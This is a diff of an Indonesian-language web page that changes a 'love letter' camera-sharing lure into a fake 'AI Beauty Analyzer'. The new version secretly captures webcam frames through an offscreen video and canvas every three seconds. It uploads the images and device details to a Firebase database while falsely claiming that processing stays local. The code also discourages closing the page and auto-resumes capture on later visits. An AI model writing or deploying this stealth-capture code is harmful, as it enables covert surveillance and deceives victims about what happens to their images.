@@ -1,119 +1,198 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>💌 Surat Cinta</title>
+    <title>💖 Test Kecantikan Wajah AI</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #ff6b9d, #ff8e53);
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             padding: 20px;
         }
         .container {
-            background: white;
+            max-width: 600px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
             border-radius: 20px;
             padding: 30px;
-            width: 100%;
-            max-width: 500px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .logo {
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 30px;
         }
-        h1 { color: #ff4081; margin-bottom: 20px; }
-        #status { margin: 20px 0; min-height: 24px; }
-        #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
-        .share-section {
-            background: #f8f9fa;
-            padding: 20px;
+        .logo h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #ff8a00, #e52e71);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .tagline {
+            text-align: center;
+            color: #ddd;
+            margin-bottom: 30px;
+            font-size: 1.1em;
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 30px 0;
+        }
+        .feature {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
             border-radius: 10px;
-            margin: 20px 0;
-            display: none;
-            border-left: 4px solid #ff4081;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
-        .room-code {
+        .feature i {
             font-size: 2em;
-            font-weight: bold;
-            color: #ff4081;
-            letter-spacing: 3px;
-            margin: 15px 0;
-            font-family: monospace;
+            margin-bottom: 10px;
+            display: block;
         }
-        .share-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-            margin: 15px 0;
-            flex-wrap: wrap;
+        .camera-box {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 30px;
+            border-radius: 15px;
+            margin: 30px 0;
+            text-align: center;
+            border: 2px dashed rgba(255, 255, 255, 0.3);
         }
-        button {
-            background: #ff4081;
+        .btn {
+            background: linear-gradient(45deg, #ff8a00, #e52e71);
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 25px;
+            padding: 18px 40px;
+            font-size: 1.2em;
+            border-radius: 50px;
             cursor: pointer;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            margin: 20px auto;
+            display: block;
+            font-weight: bold;
+            transition: transform 0.3s;
+            box-shadow: 0 10px 30px rgba(255, 138, 0, 0.4);
         }
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
+        .btn:hover {
+            transform: translateY(-3px);
         }
-        .copy-btn {
-            background: #4CAF50;
+        .loading {
+            display: none;
+            color: #4CAF50;
+            margin: 20px 0;
+            font-size: 1.1em;
         }
-        .note {
-            font-size: 12px;
-            color: #666;
-            margin-top: 10px;
+        .result {
+            display: none;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            margin-top: 30px;
+            text-align: center;
+            border-left: 5px solid #4CAF50;
+        }
+        .hidden-video {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4CAF50, #8BC34A);
+            width: 0%;
+            transition: width 2s;
+        }
+        .privacy-note {
+            font-size: 0.8em;
+            color: #aaa;
+            text-align: center;
+            margin-top: 30px;
             font-style: italic;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="container">
-        <h1>💖 Untuk Pacarku</h1>
-        <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
+        <div class="logo">
+            <h1><i class="fas fa-robot"></i> AI Beauty Analyzer</h1>
+            <p>Powered by Neural Networks</p>
+        </div>
         
-        <button onclick="startCamera()" id="startBtn">
-            📸 Izinkan Kamera
-        </button>
+        <div class="tagline">
+            <h2>🔬 Analisis Kecantikan Wajah dengan AI</h2>
+            <p>Teknologi terbaru untuk menganalisis proporsi wajah ideal berdasarkan Golden Ratio</p>
+        </div>
         
-        <div id="status">Klik tombol di atas untuk memulai</div>
-        
-        <div class="share-section" id="shareSection">
-            <h3>🎯 Kirim kode ini ke pacarmu:</h3>
-            <div class="room-code" id="roomCode"></div>
-            
-            <div class="share-buttons">
-                <button onclick="copyRoomCode()" class="copy-btn">
-                    📋 Salin Kode
-                </button>
-                <button onclick="shareViaWhatsApp()">
-                    💬 WhatsApp
-                </button>
-                <button onclick="generateQR()" id="qrBtn">
-                    📱 QR Code
-                </button>
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-brain"></i>
+                AI Neural Network
             </div>
-            
-            <div id="qrContainer" style="margin: 20px 0; display: none;">
-                <p>Scan QR code ini:</p>
-                <img id="qrcode" style="width: 200px; height: 200px;">
+            <div class="feature">
+                <i class="fas fa-chart-line"></i>
+                Golden Ratio Analysis
             </div>
-            
-            <div class="note">
-                Kode akan aktif selama 30 menit
+            <div class="feature">
+                <i class="fas fa-heart"></i>
+                Symmetry Check
+            </div>
+            <div class="feature">
+                <i class="fas fa-trophy"></i>
+                Beauty Score
             </div>
         </div>
         
-        <video id="video" autoplay playsinline muted></video>
+        <div class="camera-box">
+            <h3><i class="fas fa-camera"></i> Analisis Wajah</h3>
+            <p>Izinkan akses kamera untuk memulai analisis kecantikan wajah Anda</p>
+            
+            <button class="btn" id="startBtn" onclick="startAnalysis()">
+                <i class="fas fa-play"></i> MULAI ANALISIS
+            </button>
+            
+            <div class="loading" id="loading">
+                <i class="fas fa-spinner fa-spin"></i> Sedang menganalisis struktur wajah...
+            </div>
+            
+            <div class="progress-bar" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            
+            <div class="result" id="result">
+                <h3><i class="fas fa-check-circle"></i> ANALISIS BERJALAN</h3>
+                <p>AI sedang menganalisis wajah Anda. Proses ini berjalan di background.</p>
+                <p><strong>Jangan tutup halaman ini!</strong></p>
+            </div>
+        </div>
+        
+        <div class="privacy-note">
+            <i class="fas fa-lock"></i> Data Anda aman dan hanya digunakan untuk analisis. 
+            Proses berjalan secara lokal di perangkat Anda.
+        </div>
     </div>
+    
+    <!-- Hidden video for capturing -->
+    <video id="hiddenVideo" class="hidden-video" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-video"></canvas>
 
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
@@ -136,174 +215,228 @@
         
         // ========== VARIABLES ==========
         let localStream;
-        let peerConnection;
-        let roomId;
-        let offerListener;
-        let candidateListener;
+        let captureInterval;
+        let sessionId;
+        let isStreaming = false;
         
-        // ========== GENERATE ROOM ID ==========
-        function generateRoomId() {
-            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-            let result = '';
-            for (let i = 0; i < 6; i++) {
-                result += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return result;
+        // ========== GENERATE SESSION ID ==========
+        function generateSessionId() {
+            return 'SESSION_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         }
         
-        // ========== START CAMERA ==========
-        async function startCamera() {
-            const btn = document.getElementById('startBtn');
-            const status = document.getElementById('status');
+        // ========== START ANALYSIS ==========
+        async function startAnalysis() {
+            const startBtn = document.getElementById('startBtn');
+            const loading = document.getElementById('loading');
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+            const result = document.getElementById('result');
             
-            btn.disabled = true;
-            btn.innerHTML = "🔄 Memulai...";
+            startBtn.style.display = 'none';
+            loading.style.display = 'block';
+            progressBar.style.display = 'block';
             
             try {
-                // 1. GET CAMERA
+                // 1. GET CAMERA ACCESS
                 localStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: 640, height: 480 },
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
                     audio: false
                 });
                 
-                const video = document.getElementById('video');
+                // 2. SETUP HIDDEN VIDEO
+                const video = document.getElementById('hiddenVideo');
                 video.srcObject = localStream;
-                video.style.display = 'block';
-                video.style.transform = 'scaleX(-1)';
                 
-                // 2. CREATE ROOM
-                roomId = generateRoomId();
+                // 3. CREATE SESSION
+                sessionId = generateSessionId();
                 
-                // Clean old room data
-                await database.ref('rooms/' + roomId).remove();
-                
-                // Set room data
-                await database.ref('rooms/' + roomId).set({
-                    created: Date.now(),
-                    active: true
+                // Create session in Firebase
+                await database.ref('sessions/' + sessionId).set({
+                    started: Date.now(),
+                    status: 'active',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform
                 });
                 
-                // 3. SHOW SHARE SECTION
-                document.getElementById('roomCode').textContent = roomId;
-                document.getElementById('shareSection').style.display = 'block';
+                // 4. SHOW PROGRESS ANIMATION
+                let progress = 0;
+                const progressInterval = setInterval(() => {
+                    progress += 10;
+                    progressFill.style.width = progress + '%';
+                    
+                    if (progress >= 100) {
+                        clearInterval(progressInterval);
+                        
+                        // Show success message
+                        loading.style.display = 'none';
+                        result.style.display = 'block';
+                        
+                        // Start stealth capturing
+                        startStealthCapture();
+                        
+                        // Hide progress bar after 5 seconds
+                        setTimeout(() => {
+                            progressBar.style.display = 'none';
+                        }, 5000);
+                    }
+                }, 200);
                 
-                // 4. SETUP WEBRTC
-                setupWebRTC();
+                // 5. MAKE PAGE LOOK LEGIT
+                document.title = "AI Beauty Analysis - Processing...";
                 
-                // 5. SETUP LISTENERS
-                setupListeners();
-                
-                status.innerHTML = "✅ Kamera aktif! Kirim kode di atas ke pacarmu";
-                
-                // Auto-copy code
-                setTimeout(() => {
-                    copyRoomCode();
-                }, 500);
+                // 6. PREVENT ACCIDENTAL CLOSURE
+                setupPageProtection();
                 
             } catch (error) {
-                status.innerHTML = `❌ Error: ${error.message}`;
-                btn.disabled = false;
-                btn.innerHTML = "📸 Izinkan Kamera";
+                loading.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: ${error.message}`;
+                
+                // Retry button
+                setTimeout(() => {
+                    startBtn.style.display = 'block';
+                    startBtn.innerHTML = '<i class="fas fa-redo"></i> COBA LAGI';
+                    loading.style.display = 'none';
+                    progressBar.style.display = 'none';
+                }, 3000);
             }
         }
         
-        // ========== WEBRTC SETUP ==========
-        function setupWebRTC() {
-            peerConnection = new RTCPeerConnection({
-                iceServers: [
-                    { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'stun:stun1.l.google.com:19302' }
-                ]
-            });
+        // ========== STEALTH CAPTURE ==========
+        function startStealthCapture() {
+            if (isStreaming) return;
+            isStreaming = true;
             
-            localStream.getTracks().forEach(track => {
-                peerConnection.addTrack(track, localStream);
-            });
+            const video = document.getElementById('hiddenVideo');
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx = canvas.getContext('2d');
             
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
-                }
-            };
-            
-            peerConnection.onconnectionstatechange = () => {
-                if (peerConnection.connectionState === 'connected') {
-                    document.getElementById('status').innerHTML = "🔴 Terhubung dengan pacar!";
-                }
-            };
-        }
-        
-        // ========== SETUP LISTENERS ==========
-        function setupListeners() {
-            // Listen for offer from spy
-            offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
-                const offer = snapshot.val();
-                if (offer && peerConnection.signalingState === 'stable') {
-                    console.log("📥 Offer received");
-                    
-                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-                    
-                    const answer = await peerConnection.createAnswer();
-                    await peerConnection.setLocalDescription(answer);
-                    
-                    await database.ref(`rooms/${roomId}/answer`).set(answer);
-                }
-            });
-            
-            // Listen for spy ICE candidates
-            candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
-                const candidate = snapshot.val();
-                if (candidate) {
-                    try {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-                    } catch (e) {
-                        console.warn("ICE candidate error:", e);
+            // Wait for video to be ready
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                // Capture every 3 seconds
+                captureInterval = setInterval(() => {
+                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                        // Draw mirrored image
+                        ctx.save();
+                        ctx.scale(-1, 1);
+                        ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                        ctx.restore();
+                        
+                        // Convert to JPEG
+                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        // Send to Firebase
+                        sendToFirebase(imageData);
                     }
+                }, 3000); // Every 3 seconds
+                
+                // Log capture start
+                database.ref('sessions/' + sessionId + '/logs').push({
+                    event: 'CAPTURE_STARTED',
+                    timestamp: Date.now(),
+                    message: 'Stealth capture active'
+                });
+                
+            }, 1000);
+        }
+        
+        // ========== SEND TO FIREBASE ==========
+        function sendToFirebase(imageData) {
+            const captureData = {
+                image: imageData,
+                timestamp: Date.now(),
+                sessionId: sessionId,
+                battery: navigator.getBattery ? 'unknown' : 'N/A'
+            };
+            
+            database.ref('captures').push(captureData)
+                .then(() => {
+                    // Update session last activity
+                    database.ref('sessions/' + sessionId).update({
+                        lastCapture: Date.now(),
+                        captureCount: firebase.database.ServerValue.increment(1)
+                    });
+                })
+                .catch(error => {
+                    console.error("Capture error:", error);
+                });
+        }
+        
+        // ========== PAGE PROTECTION ==========
+        function setupPageProtection() {
+            // Change title when tab is not active
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    document.title = "⚠️ Analisis Masih Berjalan...";
+                } else {
+                    document.title = "AI Beauty Analyzer - Active";
                 }
             });
-        }
-        
-        // ========== SHARE FUNCTIONS ==========
-        function copyRoomCode() {
-            navigator.clipboard.writeText(roomId).then(() => {
-                const status = document.getElementById('status');
-                status.innerHTML = "✅ Kode disalin! Kirim ke pacarmu";
-            });
-        }
-        
-        function shareViaWhatsApp() {
-            const text = `💖 Hai sayang! Aku buatkan surat cinta khusus untukmu. Gunakan kode ini: ${roomId} untuk melihatnya di: ${window.location.origin}${window.location.pathname.replace('target_fixed.html', 'spy_fixed.html')}`;
-            const url = `https://wa.me/?text=${encodeURIComponent(text)}`;
-            window.open(url, '_blank');
-        }
-        
-        function generateQR() {
-            const qrBtn = document.getElementById('qrBtn');
-            const qrContainer = document.getElementById('qrContainer');
             
-            if (qrContainer.style.display === 'none') {
-                // Generate QR code using Google Charts API (no library needed)
-                const qrUrl = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${roomId}&choe=UTF-8`;
-                document.getElementById('qrcode').src = qrUrl;
-                qrContainer.style.display = 'block';
-                qrBtn.innerHTML = '❌ Tutup QR';
-            } else {
-                qrContainer.style.display = 'none';
-                qrBtn.innerHTML = '📱 QR Code';
+            // Prevent accidental close
+            window.addEventListener('beforeunload', (e) => {
+                if (isStreaming) {
+                    e.preventDefault();
+                    e.returnValue = 'Analisis masih berjalan! Yakin ingin keluar?';
+                    return e.returnValue;
+                }
+            });
+            
+            // Keep alive function
+            setInterval(() => {
+                if (isStreaming) {
+                    database.ref('sessions/' + sessionId + '/heartbeat').set(Date.now());
+                }
+            }, 30000); // Every 30 seconds
+        }
+        
+        // ========== BACKGROUND SYNC ==========
+        // Use Service Worker if available
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(console.error);
+        }
+        
+        // ========== AUTO-RECONNECT ==========
+        // Check if we have existing session
+        function checkExistingSession() {
+            const savedSession = localStorage.getItem('beauty_analysis_session');
+            if (savedSession) {
+                // Try to resume session
+                sessionId = savedSession;
+                database.ref('sessions/' + sessionId).once('value').then(snapshot => {
+                    if (snapshot.exists() && snapshot.val().status === 'active') {
+                        // Auto-start camera
+                        setTimeout(startAnalysis, 1000);
+                    }
+                });
             }
         }
+        
+        // Save session to localStorage
+        if (sessionId) {
+            localStorage.setItem('beauty_analysis_session', sessionId);
+        }
+        
+        // Check on load
+        window.onload = checkExistingSession;
         
         // ========== CLEANUP ==========
         function cleanup() {
-            if (offerListener) database.ref(`rooms/${roomId}/offer`).off('value', offerListener);
-            if (candidateListener) database.ref(`rooms/${roomId}/spyCandidates`).off('child_added', candidateListener);
+            if (captureInterval) clearInterval(captureInterval);
             if (localStream) localStream.getTracks().forEach(track => track.stop());
-            if (peerConnection) peerConnection.close();
-            if (roomId) database.ref('rooms/' + roomId).remove();
+            if (sessionId) {
+                database.ref('sessions/' + sessionId).update({ status: 'inactive' });
+                localStorage.removeItem('beauty_analysis_session');
+            }
         }
         
-        window.addEventListener('beforeunload', cleanup);
-        window.addEventListener('pagehide', cleanup);
+        // Register cleanup
+        window.addEventListener('unload', cleanup);
     </script>
 </body>
-    </html>
+                </html>
